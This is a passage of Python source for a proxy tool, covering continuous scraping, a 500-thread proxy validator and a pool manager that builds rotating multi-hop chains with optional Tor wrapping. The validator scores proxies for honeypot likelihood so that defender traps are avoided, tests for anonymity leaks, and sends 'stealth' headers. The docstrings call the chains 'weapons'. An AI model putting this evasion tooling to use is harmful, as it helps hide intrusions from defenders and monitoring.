        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self._scrape_single_source, src): src for src in self.sources.keys()}
            for future in as_completed(futures):
                src = futures[future]
                try:
                    proxies = future.result(timeout=30)
                    for p in proxies:
                        key = (p.ip, p.port, p.protocol)
                        if key not in seen:
                            seen.add(key)
                            all_proxies.append(p)
                except Exception as e:
                    if self.logger:
                        self.logger.error("ProxyScraper", f"Source {src.name} failed: {e}")

        self.scraped_count = len(all_proxies)

        if self.logger:
            self.logger.info("ProxyScraper", f"Total unique proxies scraped: {len(all_proxies)}")

        return all_proxies

    def scrape_source(self, source: ProxySource) -> List[ProxyNode]:
        return self._scrape_single_source(source)

    def start_continuous_scraping(self, interval: int = PROXY_SCRAPE_INTERVAL):
        """Start a background thread that continuously scrapes proxies."""
        def scrape_loop():
            while self._scraping_active:
                try:
                    proxies = self.scrape_all_sources()
                    with self._cache_lock:
                        for p in proxies:
                            key = (p.ip, p.port, p.protocol)
                            self._proxy_cache[key] = p
                    time.sleep(interval)
                except Exception as e:
                    if self.logger:
                        self.logger.error("ProxyScraper", f"Continuous scraping error: {e}")
                    time.sleep(interval)

        self._scraping_active = True
        self._scrape_thread = threading.Thread(target=scrape_loop, daemon=True)
        self._scrape_thread.start()

        if self.logger:
            self.logger.info("ProxyScraper", "Continuous scraping started")

    def stop_continuous_scraping(self):
        self._scraping_active = False
        if self._scrape_thread:
            self._scrape_thread.join(timeout=5)
        if self.logger:
            self.logger.info("ProxyScraper", "Continuous scraping stopped")

    def get_cached_proxies(self) -> List[ProxyNode]:
        with self._cache_lock:
            return list(self._proxy_cache.values())

    def get_source_stats(self) -> Dict[str, Dict[str, Any]]:
        return {k.name: v for k, v in self.source_stats.items()}



# ============================================================================
# SECTION 8: PROXY VALIDATOR — 500 Concurrent Threads. Behavioral Analysis.
# ============================================================================

class ProxyValidator:
    """Validates proxies with 500 concurrent threads.

    Every proxy is tested, measured, dissected.
    Behavioral analysis reads its soul.
    Honeypot detection smells the bait.
    Leak tests expose its naked truth.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self._lock = threading.RLock()
        self.validation_stats = {
            "total_tested": 0,
            "total_valid": 0,
            "total_failed": 0,
            "total_honeypots": 0,
            "total_tor_exits": 0,
            "avg_speed": 0.0,
            "last_validation": ""
        }
        self._validation_active = False
        self._validation_thread = None
        self._test_urls = [
            "http://httpbin.org/ip",
            "http://httpbin.org/headers",
            "http://httpbin.org/user-agent",
            "https://httpbin.org/ip",
            "https://httpbin.org/headers",
            "http://icanhazip.com",
            "http://ipinfo.io/json",
            "http://checkip.amazonaws.com",
        ]
        self._anonymity_test_urls = [
            "http://httpbin.org/headers",
            "http://httpbin.org/ip",
        ]
        self._leak_test_urls = {
            "dns": "http://dnsleaktest.com/api/servers",
            "webrtc": "https://browserleaks.com/webrtc",
            "ipv6": "http://ipv6.icanhazip.com",
        }
        self._country_api = "http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"

    def _create_proxy_dict(self, proxy: ProxyNode) -> Dict[str, str]:
        proxy_url = proxy.get_url()
        if proxy.credentials:
            user, pwd = proxy.credentials
            proxy_url = f"{proxy.protocol}://{user}:{pwd}@{proxy.ip}:{proxy.port}"
        return {
            "http": proxy_url,
            "https": proxy_url,
        }

    def _test_http_proxy(self, proxy: ProxyNode, timeout: float = 10.0) -> Dict[str, Any]:
        result = {
            "working": False,
            "speed_ms": 999999.0,
            "anonymity": "transparent",
            "country": "",
            "isp": "",
            "asn": "",
            "real_ip": "",
            "headers_sent": {},
            "headers_received": {},
            "error": "",
            "is_honeypot": False,
            "honeypot_score": 0.0,
            "dns_leak": False,
            "webrtc_leak": False,
            "ipv6_leak": False,
            "bandwidth_mbps": 0.0,
            "behavioral_score": 0.0,
            "threat_level": "low",
        }

        if not REQUESTS_AVAILABLE:
            result["error"] = "requests not available"
            return result

        proxies = self._create_proxy_dict(proxy)
        test_url = random.choice(self._test_urls)

        start_time = time.time()
        try:
            response = requests.get(
                test_url, proxies=proxies, timeout=timeout,
                headers=STEALTH_HEADERS, allow_redirects=True
            )
            elapsed = (time.time() - start_time) * 1000
            result["speed_ms"] = elapsed
            result["headers_received"] = dict(response.headers)

            if response.status_code == 200:
                result["working"] = True

                # Anonymity detection
                try:
                    data = response.json()
                    origin = data.get("origin", "")
                    headers = data.get("headers", {})
                    result["headers_sent"] = headers
                    result["real_ip"] = origin

                    # Check for forwarded headers
                    forwarded_headers = ["X-Forwarded-For", "X-Real-Ip", "X-ProxyUser-Ip",
                                        "X-Original-Forwarded-For", "CF-Connecting-IP",
                                        "True-Client-IP", "X-Cluster-Client-IP"]
                    has_forwarded = any(h in headers for h in forwarded_headers)

                    # Check for proxy headers
                    proxy_headers = ["Via", "X-Proxy-ID", "X-Proxy-Id", "Proxy-Connection",
                                    "X-Cache", "X-Cache-Lookup", "X-Squid-Error"]
                    has_proxy = any(h in headers for h in proxy_headers)

                    if not has_forwarded and not has_proxy:
                        result["anonymity"] = "elite"
                    elif not has_forwarded and has_proxy:
                        result["anonymity"] = "anonymous"
                    else:
                        result["anonymity"] = "transparent"
                except:
                    # Non-JSON response, check raw
                    text = response.text.strip()
                    if text and re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", text):
                        result["real_ip"] = text
                        result["anonymity"] = "elite"

                # Country/ISP resolution
                if result["real_ip"]:
                    try:
                        country_url = self._country_api.format(ip=result["real_ip"])
                        country_resp = requests.get(country_url, timeout=5, headers=STEALTH_HEADERS)
                        if country_resp.status_code == 200:
                            cdata = country_resp.json()
                            if cdata.get("status") == "success":
                                result["country"] = cdata.get("countryCode", "")
                                result["isp"] = cdata.get("isp", "")
                                result["asn"] = cdata.get("as", "")
                                if cdata.get("proxy") or cdata.get("hosting"):
                                    result["threat_level"] = "medium"
                    except:
                        pass

                # Honeypot detection
                result["honeypot_score"] = self._detect_honeypot(proxy, response, elapsed)
                result["is_honeypot"] = result["honeypot_score"] > 0.7

                # Behavioral analysis
                result["behavioral_score"] = self._behavioral_analysis(proxy, response, elapsed)

                # Bandwidth estimation
                result["bandwidth_mbps"] = self._estimate_bandwidth(proxy, timeout)

                # Leak tests
                if PROXY_WEBRTC_LEAK_TEST:
                    result["webrtc_leak"] = self._test_webrtc_leak(proxy, timeout)
                if PROXY_DNS_LEAK_TEST:
                    result["dns_leak"] = self._test_dns_leak(proxy, timeout)
                if PROXY_IPV6_LEAK_TEST:
                    result["ipv6_leak"] = self._test_ipv6_leak(proxy, timeout)

                # Threat assessment
                if result["is_honeypot"]:
                    result["threat_level"] = "critical"
                elif result["dns_leak"] or result["webrtc_leak"] or result["ipv6_leak"]:
                    result["threat_level"] = "high"
                elif result["anonymity"] == "transparent":
                    result["threat_level"] = "medium"

        except requests.exceptions.ConnectTimeout:
            result["error"] = "connect_timeout"
        except requests.exceptions.ReadTimeout:
            result["error"] = "read_timeout"
        except requests.exceptions.ProxyError as e:
            result["error"] = f"proxy_error: {str(e)[:50]}"
        except requests.exceptions.SSLError:
            result["error"] = "ssl_error"
        except Exception as e:
            result["error"] = f"error: {str(e)[:50]}"

        return result

    def _test_socks_proxy(self, proxy: ProxyNode, timeout: float = 10.0) -> Dict[str, Any]:
        result = {
            "working": False,
            "speed_ms": 999999.0,
            "anonymity": "transparent",
            "country": "",
            "isp": "",
            "asn": "",
            "real_ip": "",
            "error": "",
            "is_honeypot": False,
            "honeypot_score": 0.0,
            "dns_leak": False,
            "webrtc_leak": False,
            "ipv6_leak": False,
            "bandwidth_mbps": 0.0,
            "behavioral_score": 0.0,
            "threat_level": "low",
        }

        if not SOCKS_AVAILABLE:
            result["error"] = "socks library not available"
            return result

        try:
            import socket
            import socks as socks_lib

            original_socket = socket.socket
            s = socks_lib.socksocket()

            if proxy.protocol == "socks4":
                s.set_proxy(socks_lib.SOCKS4, proxy.ip, proxy.port)
            else:
                s.set_proxy(socks_lib.SOCKS5, proxy.ip, proxy.port)

            start_time = time.time()
            s.settimeout(timeout)
            s.connect(("httpbin.org", 80))

            request = b"GET /ip HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"
            s.sendall(request)

            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk

            elapsed = (time.time() - start_time) * 1000
            result["speed_ms"] = elapsed

            response_text = response.decode("utf-8", errors="ignore")
            if "200 OK" in response_text:
                result["working"] = True
                result["anonymity"] = "elite"  # SOCKS proxies are generally elite

                # Extract IP from response body
                try:
                    body = response_text.split("\r\n\r\n", 1)[1]
                    data = json.loads(body)
                    result["real_ip"] = data.get("origin", "")
                except:
                    pass

                # Country resolution
                if result["real_ip"]:
                    try:
                        country_url = self._country_api.format(ip=result["real_ip"])
                        country_resp = requests.get(country_url, timeout=5, headers=STEALTH_HEADERS)
                        if country_resp.status_code == 200:
                            cdata = country_resp.json()
                            if cdata.get("status") == "success":
                                result["country"] = cdata.get("countryCode", "")
                                result["isp"] = cdata.get("isp", "")
                                result["asn"] = cdata.get("as", "")
                    except:
                        pass

                # Honeypot detection for SOCKS
                result["honeypot_score"] = self._detect_honeypot_socks(proxy, elapsed)
                result["is_honeypot"] = result["honeypot_score"] > 0.7

                # Behavioral analysis
                result["behavioral_score"] = self._behavioral_analysis(proxy, None, elapsed)

                if result["is_honeypot"]:
                    result["threat_level"] = "critical"

            s.close()
            socket.socket = original_socket

        except Exception as e:
            result["error"] = f"socks_error: {str(e)[:50]}"
            try:
                socket.socket = original_socket
            except:
                pass

        return result

    def _detect_honeypot(self, proxy: ProxyNode, response, elapsed: float) -> float:
        score = 0.0

        # Check response headers for honeypot signatures
        headers = dict(response.headers) if response else {}
        for sig in HONEYPOT_SIGNATURES["headers"]:
            if sig.lower() in [k.lower() for k in headers.keys()]:
                score += 0.3

        # Check response body for honeypot patterns
        if response:
            try:
                text = response.text.lower()
                for pattern in HONEYPOT_SIGNATURES["body_patterns"]:
                    if re.search(pattern, text):
                        score += 0.2
            except:
                pass

        # Timing anomaly detection
        if elapsed < HONEYPOT_SIGNATURES["timing_anomalies"]["too_fast"]:
            score += 0.15  # Too fast = suspicious
        if elapsed > HONEYPOT_SIGNATURES["timing_anomalies"]["too_slow"]:
            score += 0.1  # Too slow = might be analyzing

        # Port signature
        if proxy.port in HONEYPOT_SIGNATURES["port_signatures"]:
            score += 0.1

        # IP range check
        try:
            ip_obj = ipaddress.ip_address(proxy.ip)
            for range_str in HONEYPOT_SIGNATURES["ip_ranges"]:
                if ip_obj in ipaddress.ip_network(range_str):
                    score += 0.1
        except:
            pass

        # Behavioral: perfect availability is suspicious
        if proxy.total_requests > 50 and proxy.failure_count == 0:
            score += 0.1

        return min(score, 1.0)

    def _detect_honeypot_socks(self, proxy: ProxyNode, elapsed: float) -> float:
        score = 0.0

        # SOCKS honeypots often have suspicious ports
        if proxy.port in HONEYPOT_SIGNATURES["port_signatures"]:
            score += 0.2

        # Timing check
        if elapsed < HONEYPOT_SIGNATURES["timing_anomalies"]["too_fast"]:
            score += 0.15

        # IP range
        try:
            ip_obj = ipaddress.ip_address(proxy.ip)
            for range_str in HONEYPOT_SIGNATURES["ip_ranges"]:
                if ip_obj in ipaddress.ip_network(range_str):
                    score += 0.15
        except:
            pass

        # Perfect availability
        if proxy.total_requests > 50 and proxy.failure_count == 0:
            score += 0.1

        return min(score, 1.0)

    def _behavioral_analysis(self, proxy: ProxyNode, response, elapsed: float) -> float:
        score = 0.0

        # Speed variance analysis
        if proxy.response_times:
            if len(proxy.response_times) >= 5:
                avg = sum(proxy.response_times) / len(proxy.response_times)
                variance = sum((t - avg) ** 2 for t in proxy.response_times) / len(proxy.response_times)
                std_dev = variance ** 0.5
                if avg > 0:
                    cv = std_dev / avg
                    if cv < BEHAVIORAL_THRESHOLDS["speed_variance_max"]:
                        score += 0.1  # Too consistent = suspicious

        # Failure rate
        if proxy.total_requests > 10:
            failure_rate = proxy.failure_count / proxy.total_requests
            if failure_rate > BEHAVIORAL_THRESHOLDS["failure_rate_max"]:
                score -= 0.2  # High failure rate = bad proxy
            elif failure_rate == 0:
                score += 0.1  # Zero failures = suspicious

        # Response pattern entropy
        if response:
            try:
                headers = dict(response.headers)
                header_values = " ".join(headers.values())
                # Simple entropy calculation
                if len(header_values) > 0:
                    freq = {}
                    for c in header_values:
                        freq[c] = freq.get(c, 0) + 1
                    entropy = -sum((f / len(header_values)) * math.log2(f / len(header_values)) for f in freq.values())
                    if entropy < BEHAVIORAL_THRESHOLDS["response_pattern_entropy_min"]:
                        score += 0.1
            except:
                pass

        # Header consistency
        if proxy.headers_received and response:
            try:
                current_headers = set(response.headers.keys())
                previous_headers = set(proxy.headers_received.keys())
                if previous_headers:
                    intersection = current_headers & previous_headers
                    union = current_headers | previous_headers
                    consistency = len(intersection) / len(union) if union else 1.0
                    if consistency > BEHAVIORAL_THRESHOLDS["header_consistency_threshold"]:
                        score += 0.05
            except:
                pass

        return min(max(score, 0.0), 1.0)

    def _estimate_bandwidth(self, proxy: ProxyNode, timeout: float) -> float:
        if not REQUESTS_AVAILABLE:
            return 0.0
        try:
            proxies = self._create_proxy_dict(proxy)
            start = time.time()
            response = requests.get("http://speedtest.tele2.net/10MB.zip", 
                                   proxies=proxies, timeout=timeout,
                                   stream=True, headers=STEALTH_HEADERS)
            total_bytes = 0
            for chunk in response.iter_content(chunk_size=8192):
                total_bytes += len(chunk)
                if time.time() - start > timeout:
                    break
            elapsed = time.time() - start
            if elapsed > 0:
                mbps = (total_bytes * 8) / (elapsed * 1000000)
                return mbps
        except:
            pass
        return 0.0

    def _test_webrtc_leak(self, proxy: ProxyNode, timeout: float) -> bool:
        # Simplified: check if proxy IP matches real IP in different contexts
        if not REQUESTS_AVAILABLE:
            return False
        try:
            proxies = self._create_proxy_dict(proxy)
            # Get IP through proxy
            resp1 = requests.get("http://httpbin.org/ip", proxies=proxies, 
                                timeout=timeout, headers=STEALTH_HEADERS)
            proxy_ip = ""
            if resp1.status_code == 200:
                proxy_ip = resp1.json().get("origin", "")

            # Check if this IP leaks in other contexts
            # In a real implementation, this would test WebRTC APIs
            # For now, we flag if the proxy is transparent
            return proxy_ip != "" and proxy.anonymity == "transparent"
        except:
            return False

    def _test_dns_leak(self, proxy: ProxyNode, timeout: float) -> bool:
        if not REQUESTS_AVAILABLE:
            return False
        try:
            proxies = self._create_proxy_dict(proxy)
            resp = requests.get("http://dnsleaktest.com/api/servers", 
                               proxies=proxies, timeout=timeout, headers=STEALTH_HEADERS)
            if resp.status_code == 200:
                servers = resp.json()
                # If we see multiple DNS servers, there might be a leak
                if len(servers) > 1:
                    return True
        except:
            pass
        return False

    def _test_ipv6_leak(self, proxy: ProxyNode, timeout: float) -> bool:
        if not REQUESTS_AVAILABLE:
            return False
        try:
            proxies = self._create_proxy_dict(proxy)
            resp = requests.get("http://ipv6.icanhazip.com", 
                               proxies=proxies, timeout=timeout, headers=STEALTH_HEADERS)
            if resp.status_code == 200 and resp.text.strip():
                # If we get an IPv6 address, there's a leak
                return ":" in resp.text.strip()
        except:
            pass
        return False

    def validate_proxy(self, proxy: ProxyNode, timeout: float = 10.0) -> ProxyNode:
        """Validate a single proxy. Dissect it. Know it."""
        self.validation_stats["total_tested"] += 1

        if proxy.protocol in ("http", "https"):
            result = self._test_http_proxy(proxy, timeout)
        elif proxy.protocol in ("socks4", "socks5"):
            result = self._test_socks_proxy(proxy, timeout)
        elif proxy.protocol == "tor_bridge":
            result = self._test_tor_bridge(proxy, timeout)
        else:
            result = self._test_http_proxy(proxy, timeout)

        proxy.is_alive = result["working"]
        proxy.speed_ms = result["speed_ms"]
        proxy.anonymity = result["anonymity"]
        proxy.country = result["country"]
        proxy.isp = result["isp"]
        proxy.asn = result["asn"]
        proxy.is_honeypot = result["is_honeypot"]
        proxy.bandwidth_mbps = result["bandwidth_mbps"]
        proxy.behavioral_score = result["behavioral_score"]
        proxy.threat_level = result["threat_level"]
        proxy.dns_leak_risk = result["dns_leak"]
        proxy.webrtc_leak_risk = result["webrtc_leak"]
        proxy.ipv6_leak_risk = result["ipv6_leak"]
        proxy.last_tested = datetime.datetime.utcnow().isoformat()

        if result["working"]:
            self.validation_stats["total_valid"] += 1
            proxy.update_reliability(True, result["speed_ms"])
        else:
            self.validation_stats["total_failed"] += 1
            proxy.update_reliability(False, result["speed_ms"])

        if result["is_honeypot"]:
            self.validation_stats["total_honeypots"] += 1

        return proxy

    def _test_tor_bridge(self, proxy: ProxyNode, timeout: float) -> Dict[str, Any]:
        result = {
            "working": False,
            "speed_ms": 999999.0,
            "anonymity": "elite",
            "country": "TOR",
            "isp": "Tor Project",
            "asn": "",
            "real_ip": "",
            "error": "",
            "is_honeypot": False,
            "honeypot_score": 0.0,
            "dns_leak": False,
            "webrtc_leak": False,
            "ipv6_leak": False,
            "bandwidth_mbps": 0.0,
            "behavioral_score": 0.0,
            "threat_level": "low",
        }

        if not SOCKS_AVAILABLE:
            result["error"] = "socks library not available for tor bridge test"
            return result

        try:
            import socket
            import socks as socks_lib

            original_socket = socket.socket
            s = socks_lib.socksocket()
            s.set_proxy(socks_lib.SOCKS5, proxy.ip, proxy.port)
            s.settimeout(timeout)

            start_time = time.time()
            s.connect(("check.torproject.org", 443))

            # Simple TLS handshake
            import ssl
            context = ssl.create_default_context()
            ssock = context.wrap_socket(s, server_hostname="check.torproject.org")
            ssock.sendall(b"GET / HTTP/1.1\r\nHost: check.torproject.org\r\nConnection: close\r\n\r\n")

            response = b""
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response += chunk

            elapsed = (time.time() - start_time) * 1000
            result["speed_ms"] = elapsed

            if b"200 OK" in response:
                result["working"] = True
                result["is_tor_exit"] = True

            ssock.close()
            socket.socket = original_socket

        except Exception as e:
            result["error"] = f"tor_bridge_error: {str(e)[:50]}"
            try:
                socket.socket = original_socket
            except:
                pass

        return result

    def validate_proxies_parallel(self, proxies: List[ProxyNode], 
                                   max_workers: int = PROXY_VALIDATION_THREADS,
                                   timeout: float = 10.0) -> List[ProxyNode]:
        """Validate proxies in parallel. 500 threads. A swarm of testers."""
        validated = []

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.validate_proxy, p, timeout): p for p in proxies}
            for future in as_completed(futures):
                try:
                    proxy = future.result(timeout=timeout + 5)
                    validated.append(proxy)
                except Exception as e:
                    if self.logger:
                        self.logger.error("ProxyValidator", f"Validation thread error: {e}")

        self.validation_stats["last_validation"] = datetime.datetime.utcnow().isoformat()

        if self.logger:
            valid_count = sum(1 for p in validated if p.is_alive)
            self.logger.info("ProxyValidator", 
                           f"Validated {len(validated)} proxies, {valid_count} alive, "
                           f"{self.validation_stats['total_honeypots']} honeypots detected")

        return validated

    def start_continuous_validation(self, proxy_manager, interval: int = PROXY_VALIDATE_INTERVAL):
        """Start background validation thread."""
        def validate_loop():
            while self._validation_active:
                try:
                    proxies = proxy_manager.get_all_proxies()
                    if proxies:
                        validated = self.validate_proxies_parallel(proxies[:500])
                        proxy_manager.update_proxies(validated)
                    time.sleep(interval)
                except Exception as e:
                    if self.logger:
                        self.logger.error("ProxyValidator", f"Continuous validation error: {e}")
                    time.sleep(interval)

        self._validation_active = True
        self._validation_thread = threading.Thread(target=validate_loop, daemon=True)
        self._validation_thread.start()

        if self.logger:
            self.logger.info("ProxyValidator", "Continuous validation started")

    def stop_continuous_validation(self):
        self._validation_active = False
        if self._validation_thread:
            self._validation_thread.join(timeout=5)
        if self.logger:
            self.logger.info("ProxyValidator", "Continuous validation stopped")

    def get_stats(self) -> Dict[str, Any]:
        return dict(self.validation_stats)



# ============================================================================
# SECTION 9: PROXY MANAGER — Pool Management, Rotation, Chains.
# ============================================================================

class ProxyManager:
    """Manages proxy pool, rotation, and chains.

    The pool is a living thing. Proxies live and die.
    Chains link them into weapons. Rotation keeps them sharp.
    Self-healing keeps them alive when one falls.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self._lock = threading.RLock()
        self._proxy_pool = {}
        self._chains = {}
        self._sticky_sessions = {}
        self._proxy_cache = []
        self._cache_time = 0
        self._cache_ttl = 30
        self._rotation_counter = 0
        self._stats = {
            "total_added": 0,
            "total_removed": 0,
            "total_rotated": 0,
            "total_chains_created": 0,
            "total_failovers": 0,
            "pool_size": 0,
            "healthy_count": 0,
            "elite_count": 0,
            "tor_count": 0,
            "iot_count": 0,
            "router_count": 0,
        }

    def add_proxy(self, proxy: ProxyNode) -> bool:
        with self._lock:
            key = (proxy.ip, proxy.port, proxy.protocol)
            self._proxy_pool[key] = proxy
            self._stats["total_added"] += 1
            self._invalidate_cache()

            # Insert into database if available
            if self.db:
                try:
                    self.db.execute(
                        """INSERT OR REPLACE INTO proxy_pool 
                           (ip, port, protocol, country, isp, asn, speed_ms, anonymity, 
                            reliability_score, last_tested, failure_count, is_honeypot, source)
                           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                        (proxy.ip, proxy.port, proxy.protocol, proxy.country, proxy.isp,
                         proxy.asn, proxy.speed_ms, proxy.anonymity, proxy.reliability_score,
                         proxy.last_tested, proxy.failure_count, int(proxy.is_honeypot), proxy.source)
                    )
                except Exception as e:
                    if self.logger:
                        self.logger.error("ProxyManager", f"DB insert failed: {e}")

            if self.logger:
                self.logger.info("ProxyManager", f"Added proxy {proxy.get_address()}")
            return True

    def add_proxies(self, proxies: List[ProxyNode]) -> int:
        count = 0
        for p in proxies:
            if self.add_proxy(p):
                count += 1
        return count

    def get_proxy(self, ip: str, port: int, protocol: str) -> Optional[ProxyNode]:
        with self._lock:
            return self._proxy_pool.get((ip, port, protocol))

    def get_all_proxies(self) -> List[ProxyNode]:
        with self._lock:
            return list(self._proxy_pool.values())

    def get_healthy_proxies(self) -> List[ProxyNode]:
        return [p for p in self.get_all_proxies() if p.is_healthy()]

    def get_elite_proxies(self) -> List[ProxyNode]:
        return [p for p in self.get_all_proxies() if p.is_elite()]

    def get_proxies_by_country(self, country: str) -> List[ProxyNode]:
        return [p for p in self.get_all_proxies() if p.country.upper() == country.upper()]

    def get_proxies_by_protocol(self, protocol: str) -> List[ProxyNode]:
        return [p for p in self.get_all_proxies() if p.protocol.lower() == protocol.lower()]

    def get_proxies_by_anonymity(self, level: str) -> List[ProxyNode]:
        return [p for p in self.get_all_proxies() if p.anonymity.lower() == level.lower()]

    def get_best_proxy(self, exclude: List[str] = None, country: str = None, 
                       protocol: str = None, min_reliability: float = 0.5) -> Optional[ProxyNode]:
        candidates = self.get_healthy_proxies()

        if exclude:
            candidates = [p for p in candidates if p.get_address() not in exclude]
        if country:
            candidates = [p for p in candidates if p.country.upper() == country.upper()]
        if protocol:
            candidates = [p for p in candidates if p.protocol.lower() == protocol.lower()]

        candidates = [p for p in candidates if p.reliability_score >= min_reliability]

        if not candidates:
            return None

        # Weighted random selection based on reliability and speed
        weights = []
        for p in candidates:
            # Higher reliability = higher weight
            # Lower speed = higher weight
            reliability_weight = p.reliability_score
            speed_weight = 1.0 / (1.0 + p.speed_ms / 1000.0)
            weight = reliability_weight * speed_weight
            weights.append(weight)

        total = sum(weights)
        if total == 0:
            return random.choice(candidates)

        r = random.uniform(0, total)
        cumsum = 0
        for i, w in enumerate(weights):
            cumsum += w
            if r <= cumsum:
                return candidates[i]

        return candidates[-1]

    def get_best_proxies(self, count: int = 10, **filters) -> List[ProxyNode]:
        candidates = self.get_healthy_proxies()

        if filters.get("country"):
            candidates = [p for p in candidates if p.country.upper() == filters["country"].upper()]
        if filters.get("protocol"):
            candidates = [p for p in candidates if p.protocol.lower() == filters["protocol"].lower()]
        if filters.get("anonymity"):
            candidates = [p for p in candidates if p.anonymity.lower() == filters["anonymity"].lower()]
        if filters.get("min_reliability"):
            candidates = [p for p in candidates if p.reliability_score >= filters["min_reliability"]]

        # Sort by reliability * speed_weight
        candidates.sort(key=lambda p: p.reliability_score / (1.0 + p.speed_ms / 1000.0), reverse=True)
        return candidates[:count]

    def mark_failed(self, ip: str, port: int, protocol: str):
        with self._lock:
            key = (ip, port, protocol)
            proxy = self._proxy_pool.get(key)
            if proxy:
                proxy.failure_count += 1
                proxy.update_reliability(False, 999999.0)

                if proxy.failure_count >= PROXY_MAX_FAILURES:
                    self.remove_proxy(ip, port, protocol)
                elif self.db:
                    try:
                        self.db.execute(
                            "UPDATE proxy_pool SET failure_count = ?, reliability_score = ? WHERE ip = ? AND port = ? AND protocol = ?",
                            (proxy.failure_count, proxy.reliability_score, ip, port, protocol)
                        )
                    except:
                        pass

                if self.logger:
                    self.logger.warning("ProxyManager", f"Proxy {ip}:{port} marked failed ({proxy.failure_count}/{PROXY_MAX_FAILURES})")

    def mark_success(self, ip: str, port: int, protocol: str, speed_ms: float):
        with self._lock:
            key = (ip, port, protocol)
            proxy = self._proxy_pool.get(key)
            if proxy:
                proxy.update_reliability(True, speed_ms)
                if self.db:
                    try:
                        self.db.execute(
                            "UPDATE proxy_pool SET reliability_score = ?, speed_ms = ?, last_tested = ?, failure_count = 0 WHERE ip = ? AND port = ? AND protocol = ?",
                            (proxy.reliability_score, speed_ms, datetime.datetime.utcnow().isoformat(), ip, port, protocol)
                        )
                    except:
                        pass

    def remove_proxy(self, ip: str, port: int, protocol: str) -> bool:
        with self._lock:
            key = (ip, port, protocol)
            if key in self._proxy_pool:
                del self._proxy_pool[key]
                self._stats["total_removed"] += 1
                self._invalidate_cache()

                if self.db:
                    try:
                        self.db.execute(
                            "DELETE FROM proxy_pool WHERE ip = ? AND port = ? AND protocol = ?",
                            (ip, port, protocol)
                        )
                    except:
                        pass

                if self.logger:
                    self.logger.info("ProxyManager", f"Removed proxy {ip}:{port}")
                return True
            return False

    def remove_dead_proxies(self) -> int:
        with self._lock:
            dead = [key for key, p in self._proxy_pool.items() 
                    if p.failure_count >= PROXY_MAX_FAILURES or not p.is_alive]
            for key in dead:
                del self._proxy_pool[key]
                self._stats["total_removed"] += 1
            self._invalidate_cache()

            if self.db:
                try:
                    self.db.execute(
                        "DELETE FROM proxy_pool WHERE failure_count >= ? OR is_honeypot = 1",
                        (PROXY_MAX_FAILURES,)
                    )
                except:
                    pass

            if self.logger:
                self.logger.info("ProxyManager", f"Removed {len(dead)} dead proxies")
            return len(dead)

    def update_proxies(self, proxies: List[ProxyNode]):
        for p in proxies:
            self.add_proxy(p)

    def create_chain(self, length: int = 3, country_path: List[str] = None,
                     protocol: str = None, min_reliability: float = 0.5,
                     tor_wrapped: bool = False, sticky: bool = False) -> ProxyChain:
        with self._lock:
            chain = ProxyChain(
                chain_id=f"chain_{secrets.token_hex(8)}",
                created_at=datetime.datetime.utcnow().isoformat(),
                is_sticky=sticky,
                rotation_strategy="round_robin",
                country_path=country_path or [],
                is_tor_wrapped=tor_wrapped,
                self_heal_enabled=PROXY_CHAIN_SELF_HEAL,
            )

            used = set()
            for i in range(length):
                target_country = country_path[i] if country_path and i < len(country_path) else None

                proxy = self.get_best_proxy(
                    exclude=list(used),
                    country=target_country,
                    protocol=protocol,
                    min_reliability=min_reliability
                )

                if proxy:
                    proxy.chain_position = i
                    proxy.chain_id = chain.chain_id
                    chain.proxies.append(proxy)
                    used.add(proxy.get_address())
                else:
                    break

            if tor_wrapped:
                # Add Tor bridges at the end
                tor_proxies = self.get_proxies_by_protocol("tor_bridge")
                if tor_proxies:
                    for tp in tor_proxies[:2]:
                        tp.chain_position = len(chain.proxies)
                        tp.chain_id = chain.chain_id
                        chain.tor_bridge_nodes.append(tp)
                        chain.proxies.append(tp)

            chain.total_hops = len(chain.proxies)

            # Calculate estimates
            if chain.proxies:
                chain.bandwidth_estimate = min(p.bandwidth_mbps for p in chain.proxies if p.bandwidth_mbps > 0) or 0
                chain.latency_estimate = sum(p.speed_ms for p in chain.proxies)
                chain.anonymity_level = max(
                    (p.anonymity for p in chain.proxies),
                    key=lambda x: {"transparent": 0, "anonymous": 1, "elite": 2, "ultra": 3}.get(x, 0)
                )

            self._chains[chain.chain_id] = chain
            self._stats["total_chains_created"] += 1

            if sticky:
                chain.sticky_session_id = f"sticky_{secrets.token_hex(8)}"
                chain.sticky_expires = (datetime.datetime.utcnow() + 
                                       datetime.timedelta(seconds=PROXY_STICKY_SESSION_DURATION)).isoformat()
                self._sticky_sessions[chain.sticky_session_id] = chain

            if self.logger:
                self.logger.info("ProxyManager", 
                               f"Created chain {chain.chain_id} with {len(chain.proxies)} hops")

            return chain

    def get_chain(self, chain_id: str) -> Optional[ProxyChain]:
        return self._chains.get(chain_id)

    def rotate_chain(self, chain_id: str) -> Optional[ProxyNode]:
        chain = self._chains.get(chain_id)
        if chain:
            proxy = chain.rotate()
            self._stats["total_rotated"] += 1
            if self.logger:
                self.logger.info("ProxyManager", f"Rotated chain {chain_id} to {proxy.get_address() if proxy else 'None'}")
            return proxy
        return None

    def self_heal_chain(self, chain_id: str) -> bool:
        chain = self._chains.get(chain_id)
        if chain and chain.self_heal_enabled:
            healed = chain.self_heal(self)
            if healed:
                self._stats["total_failovers"] += 1
                if self.logger:
                    self.logger.info("ProxyManager", f"Self-healed chain {chain_id}")
            return healed
        return False

    def destroy_chain(self, chain_id: str) -> bool:
        with self._lock:
            if chain_id in self._chains:
                chain = self._chains[chain_id]
                if chain.sticky_session_id:
                    self._sticky_sessions.pop(chain.sticky_session_id, None)
                del self._chains[chain_id]
                if self.logger:
                    self.logger.info("ProxyManager", f"Destroyed chain {chain_id}")
                return True
            return False

    def get_sticky_session(self, session_id: str) -> Optional[ProxyChain]:
